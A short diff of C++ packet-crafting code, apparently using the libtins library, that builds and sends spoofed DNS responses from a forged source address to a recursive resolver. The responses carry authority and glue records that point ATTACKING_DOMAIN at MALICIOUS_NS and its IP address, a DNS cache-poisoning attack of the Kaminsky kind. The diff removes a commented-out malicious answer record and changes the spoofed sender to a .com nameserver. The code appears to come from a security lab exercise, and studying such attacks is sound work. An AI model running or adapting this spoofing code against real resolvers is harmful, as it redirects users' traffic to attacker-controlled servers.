@@ -43,12 +43,7 @@ int main() {
         DNS dns_response;
         dns_response.type(DNS::RESPONSE);
         dns_response.id(query_id);
-        dns_response.recursion_desired(1);
         dns_response.add_query(dns_query);
-
-
-        // DNS::resource dns_answer1(ATTACKING_HOST, MALICIOUS_WEBSERVER, DNS::A, DNS::IN, 259200);
-        // dns_response.add_answer(dns_answer1);
 
         DNS::resource dns_authority(ATTACKING_DOMAIN, MALICIOUS_NS, DNS::NS, DNS::IN, 259200);
         dns_response.add_authority(dns_authority);
@@ -56,7 +51,7 @@ int main() {
         DNS::resource dns_additional(MALICIOUS_NS, MALICIOUS_NS_IP, DNS::A, DNS::IN, 259200);
         dns_response.add_additional(dns_additional);
 
-        IP resp_pkt = IP(RECURSIVE_DNS, AUTHORITATIVE_DNS) / UDP(33333, 53) / dns_response;
+        IP resp_pkt = IP(RECURSIVE_DNS, COM_DNS) / UDP(33333, 53) / dns_response;
         sender.send(resp_pkt);
     }
 }
